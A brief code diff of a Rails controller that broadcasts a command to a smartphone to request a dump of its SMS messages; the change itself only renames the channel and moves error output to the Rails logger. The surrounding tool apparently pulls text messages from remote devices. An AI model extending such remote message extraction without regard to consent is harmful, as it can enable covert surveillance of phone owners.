@@ -14,14 +14,14 @@ class SmsMessagesController < InheritedResources::Base
       }
       
       ActionCable.server.broadcast(
-        "command_channel_#{@smartphone.device_id}",
+        "commands_#{@smartphone.device_id}",
         command_data
       )
       
       commandOutput = ["Command sent to device #{@smartphone.device_id}", "SMS dump requested..."]
       @fileName = "sms_dump_#{Time.now.to_i}.txt"
     rescue => e
-      puts "Error on dump messages: #{e.message}"
+      Rails.logger.error("Error on dump messages: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
       @fileName = "error.txt"
     end
